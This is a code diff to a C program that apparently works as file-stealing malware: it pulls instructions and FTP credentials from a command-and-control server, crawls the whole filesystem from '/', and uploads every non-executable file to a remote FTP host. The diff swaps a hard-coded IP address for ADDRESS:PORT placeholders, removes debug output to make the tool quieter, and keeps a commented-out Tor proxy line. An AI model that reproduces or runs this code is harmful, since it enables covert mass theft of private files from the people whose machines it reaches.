@@ -59,10 +59,10 @@ char * replaceSpaces(char * string);
 
 // Globals:
 
-char * CADDRESS = "http://70.77.131.111:5677/instruction.txt";		// "http://192.168.0.200:5678/instruction.txt"
-char * USERNAMEADDRESS = "http://70.77.131.111:5677/username.txt"; 
-char * PASSWORDADDRESS = "http://70.77.131.111:5677/password.txt"; 
-char * BASEDIRECTORY = "/home/ezra/misCode";
+char * CADDRESS = "http://ADDRESS:PORT/instruction.txt";
+char * USERNAMEADDRESS = "http://ADDRESS:PORT/username.txt"; 
+char * PASSWORDADDRESS = "http://ADDRESS:PORT/password.txt"; 
+char * BASEDIRECTORY = "/";
 
 // Main function:
 
@@ -72,7 +72,6 @@ int main(void) {
 	char * username = cleanString(takeUsername());
 	char * password = cleanString(takePassword());
 	controllerDirective = takeControlInstruction();
-	printf("%s", controllerDirective);
 
 	Copy(BASEDIRECTORY, username, password);
 
@@ -89,7 +88,7 @@ void Copy(char * rootDirectory, char * username, char * password) {
 	DIR * dir = opendir(rootDirectory);
 
 	if (dir == NULL) {
-		printf("Cannot open directory.");
+		// printf("Cannot open directory.");
 		return;
 	}
 
@@ -102,20 +101,15 @@ void Copy(char * rootDirectory, char * username, char * password) {
 
 		if (S_ISREG(path_stat.st_mode)) {			// Detects Files
 			current = fullPath;
-			/*printf("File: %s\n", current);*/
 			if (access(fullPath, X_OK) != 0) {							// Checking if the file is executable; if so, we don't care about it.
 				copyContents(current, entry->d_name, username, password);				// Calling copyContents
 			}
 		}
 		else if (S_ISDIR(path_stat.st_mode)) {			// Detects Directories
 			if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
-				/*current = strcat(fullPath, "/");		*/
-				/*printf("Directory: %s\n ", current);*/
-				/*printf("Directory: %s\n ", fullPath);*/
 				Copy(fullPath, username, password);
 			}
 			else if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
-				/*printf("EXCEPTION: %s\n", entry->d_name);*/
 				continue;
 			}
 		}
@@ -137,13 +131,11 @@ void copyContents(char * fileName, char * suffix, char * username, char * passwo
 	}
 	generateRandomSequence(randomPrefix);		// Filling the newly zero-initialized memory block
 
-	/*printf("File: %s Random Prefix: %s\n", fileName, randomPrefix);*/
-
 	FILE * srcFile;
 	struct stat fileInfo;
 
 	if (stat(fileName, &fileInfo)) {
-		printf("Could not open %s: %s", fileName, strerror(errno));
+		// printf("Could not open %s: %s", fileName, strerror(errno));
 		return;
 	}
 
@@ -160,12 +152,10 @@ void copyContents(char * fileName, char * suffix, char * username, char * passwo
 
 		char * dstFileName = strcat(randomPrefix, suffix);
 
-		char prelimLink[1024] = "ftp://70.77.131.111:5678/";
+		char prelimLink[1024] = "ftp://ADDRESS:PORT/";
 		char * link = strcat(prelimLink, dstFileName);			// revert to suffix if this breaks
 
-		printf("LINK: %s\n", link);
-
-		curl_easy_setopt(curl, CURLOPT_URL, link);			// "ftp://70.77.131.111:5678/file.txt" --> only the file needs to be specified
+		curl_easy_setopt(curl, CURLOPT_URL, link);			// "ftp://ADDRESS:PORT/file.txt" --> only the file needs to be specified
 
 		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);			// Setting file upload option
 
@@ -196,18 +186,21 @@ char * takeControlInstruction(void) {			// Contact C2, place directive in file n
 	curl = curl_easy_init();									// Initializing the structure needed to make requests
 	if (curl) {
 		curl_easy_setopt(curl, CURLOPT_URL, CADDRESS);		// Setting the server
+
 		// curl_easy_setopt(curl, CURLOPT_PROXY, "socks5h://127.0.0.1:9050"); 			// Proxy server can be specified here
+
 		res = curl_easy_perform(curl);								// Make the request
+
 		if (res != CURLE_OK) {									// Handling errors
 		    fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
 		}
+
 		curl_easy_cleanup(curl);								// Cleaning up the structure we initialized earlier
 	}
 	
 	freopen("/dev/tty", "w", stdout);		// Cleaning up output redirection; This is Linux specific
 
 	char * instruction = readFile("tmp");
-	/*printf("%s", instruction);*/
 	
 	return instruction;
 }
@@ -282,19 +275,12 @@ void generateRandomSequence(char * buffer) {				// This will generate random seq
 
 	char alphaSet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
 
-	/*char * sequence = malloc(9);*/
-
 	srand(time(NULL));
-	/*int r = rand();*/
 
 	for (int i = 0; i < 9; i++) {
 		int key = rand() % (int)(sizeof(alphaSet) - 1);
 		buffer[i] = alphaSet[key];
 	}
-	
-	/*sequence[8] = '\0';*/
-
-	/*return sequence;*/
 }
 
 char * replaceSpaces(char * string) {
